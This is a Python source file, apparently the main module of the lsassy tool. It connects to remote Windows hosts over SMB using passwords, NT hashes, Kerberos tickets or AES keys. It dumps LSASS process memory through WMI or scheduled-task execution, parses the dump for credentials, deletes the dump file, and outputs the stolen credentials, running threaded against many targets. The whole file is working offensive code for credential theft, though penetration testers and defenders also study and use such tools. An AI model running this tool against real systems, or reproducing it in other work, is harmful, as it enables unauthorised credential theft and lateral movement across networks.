import sys
import argparse
import logging
from threading import Thread, RLock
from lsassy import logger
from lsassy.utils import get_targets
from lsassy.parser import Parser
from lsassy.session import Session
from lsassy.writer import Writer
from lsassy.dumper import Dumper
from lsassy.impacketfile import ImpacketFile

import pkg_resources

lock = RLock()


class TLsassy(Thread):
    """
    Main class to extract credentials from one remote host. Can be used in different threads for parallelization
    """
    def __init__(self, target_name, arguments):
        self.target = target_name
        self.args = arguments
        super().__init__(name=target_name)

    def run(self):
        """
        Main method to dump credentials on a remote host
        """
        session, file, dumper, method = None, None, None, None
        try:
            # Credential parsing
            username = self.args.username if self.args.username else ""
            password = self.args.password if self.args.password else ""

            if password == "" and username != "" and self.args.hashes is None and self.args.no_pass is False and self.args.aesKey is None:
                from getpass import getpass
                password = getpass("Password:")

            lmhash, nthash = "", ""
            if not password and self.args.hashes:
                if ":" in self.args.hashes:
                    lmhash, nthash = self.args.hashes.split(":")
                else:
                    lmhash, nthash = 'aad3b435b51404eeaad3b435b51404ee', self.args.hashes

            # Exec methods parsing
            exec_methods = self.args.exec.split(",") if self.args.exec else None

            # Dump modules options parsing
            options = {v.split("=")[0]: v.split("=")[1] for v in self.args.options.split(",")} if self.args.options else {}

            # Dump path checks
            dump_path = self.args.dump_path
            if dump_path and len(dump_path) > 1 and dump_path[1] == ":":
                if dump_path[0] != "C":
                    logging.error("Drive '{}' is not supported. 'C' drive only.".format(dump_path[0]))
                    exit(1)
                dump_path = dump_path[2:]
            if dump_path and dump_path[-1] != "\\":
                dump_path += "\\"

            parse_only = self.args.parse_only

            if parse_only and (dump_path is None or self.args.dump_name is None):
                logging.error("--dump-path and --dump-name required for --parse-only option")
                exit(1)

            session = Session()
            session.get_session(
                address=self.target,
                target_ip=self.target,
                port=self.args.port,
                lmhash=lmhash,
                nthash=nthash,
                username=username,
                password=password,
                domain=self.args.domain,
                aesKey=self.args.aesKey,
                dc_ip=self.args.dc_ip,
                kerberos=self.args.kerberos
            )

            if session.smb_session is None:
                logging.error("Couldn't connect to remote host")
                exit(1)

            if not parse_only:
                dumper = Dumper(session).load(self.args.dump_method)
                if dumper is None:
                    logging.error("Unable to load dump module")
                    exit(1)

                file = dumper.dump(no_powershell=self.args.no_powershell, exec_methods=exec_methods, dump_path=dump_path,
                                   dump_name=self.args.dump_name, timeout=self.args.timeout, **options)
                if file is None:
                    logging.error("Unable to dump lsass.")
                    exit(1)
            else:
                file = ImpacketFile(session).open(
                    share="C$",
                    path=dump_path,
                    file=self.args.dump_name,
                    timeout=self.args.timeout
                )
                if file is None:
                    logging.error("Unable to open lsass dump.")
                    exit(1)

            credentials = Parser(file).parse(parse_only=parse_only)

            if not parse_only:
                file.delete(timeout=self.args.timeout)
                logging.debug("Lsass dump successfully deleted")
            else:
                logging.debug("Not deleting lsass dump as --parse-only was provided")

            if credentials is None:
                logging.error("Unable to extract credentials from lsass. Cleaning.")
                exit(1)

            with lock:
                Writer(credentials).write(
                    self.args.format,
                    output_file=self.args.outfile,
                    quiet=self.args.quiet,
                    users_only=self.args.users
                )
        except Exception as e:
            logging.error("An unknown error has occurred.", exc_info=True)
        finally:
            try:
                file.delete(timeout=self.args.timeout)
                logging.debug("Lsass dump removed")
            except:
                pass

            try:
                session.smb_session.close()
                logging.debug("SMB session closed")
            except:
                pass


def run():
    """
    Command line function to call lsassy
    """
    version = pkg_resources.require("lsassy")[0].version
    parser = argparse.ArgumentParser(
        prog="lsassy",
        description='lsassy v{} - Remote lsass dump reader'.format(version)
    )

    group_dump = parser.add_argument_group('dump')
    group_dump.add_argument('-m', '--dump-method', action='store', default="comsvcs", help="Dumping method ({})".format(",".join(Dumper.list())))
    group_dump.add_argument('--dump-path', action='store', help='Path to store lsass dumpfile (Default: \\Windows\\Temp)')
    group_dump.add_argument('--dump-name', action='store', help='Name given to lsass dumpfile (Default: Random)')
    group_dump.add_argument('-e', '--exec', action='store',
                            help='List of execution methods, comma separated (Default: wmi,task)')
    group_dump.add_argument('--no-powershell', action='store_true', help='Disable powershell')
    group_dump.add_argument('-O', '--options', action='store',
                            help='Dump module options (Example procdump_path=/opt/procdump.exe,procdump=procdump.exe')
    group_dump.add_argument('--timeout', action='store', type=int, default=5, help='Max time to wait for lsass dump (Default 5s)')
    group_dump.add_argument('--parse-only', action='store_true', help='Parse remote dump without dumping')

    group_auth = parser.add_argument_group('authentication')
    group_auth.add_argument('-u', '--username', action='store', help='Username')
    group_auth.add_argument('-p', '--password', action='store', help='Plaintext password')
    group_auth.add_argument('-d', '--domain', default="", action='store', help='Domain name')
    group_auth.add_argument('--port', default=445, type=int, action='store', help='Port (Default: 445)')
    group_auth.add_argument('--no-pass', action='store_true', help='Do not provide password (Default: False)')
    group_auth.add_argument('-H', '--hashes', action='store', help='[LM:]NT hash')
    group_auth.add_argument('-k', '--kerberos', action="store_true",
                            help='Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on '
                                 'target parameters. If valid credentials '
                                 'cannot be found, it will use the ones specified in the command line')
    group_auth.add_argument('-dc-ip', action='store', metavar="ip address",
                            help='IP Address of the domain controller. If omitted it will use the domain part (FQDN) '
                                 'specified in the target parameter')
    group_auth.add_argument('-aesKey', action="store", metavar="hex key", help='AES key to use for Kerberos Authentication '
                                                                               '(128 or 256 bits)')

    group_out = parser.add_argument_group('output')
    group_out.add_argument('-o', '--outfile', action='store', help='Output credentials to file')
    group_out.add_argument('-f', '--format', choices=["pretty", "json", "grep"], action='store', default="pretty",
                           help='Output format (Default pretty)')
    group_out.add_argument('--users', action='store_true', help='Only display user accounts (No computer accounts)')

    parser.add_argument('-v', action='count', default=0, help='Verbosity level (-v or -vv)')
    parser.add_argument('-q', '--quiet', action='store_true', help='Quiet mode, only display credentials')
    parser.add_argument('-V', '--version', action='version', version='%(prog)s (version {})'.format(version))
    parser.add_argument('target', nargs='*', type=str, action='store',
                        help='The target IP(s), range(s), CIDR(s), hostname(s), FQDN(s), file(s) '
                             'containing a list of targets')

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    args = parser.parse_args()

    if not args.target:
        parser.print_help()
        sys.exit(1)

    # Debug level parsing
    logger.init()

    if args.v == 1:
        logging.getLogger().setLevel(logging.INFO)
    elif args.v >= 2:
        logging.getLogger().setLevel(logging.DEBUG)
    else:
        logging.getLogger().setLevel(logging.ERROR)

    for target in get_targets(args.target):
        TLsassy(target, args).start()


if __name__ == "__main__":
    run()
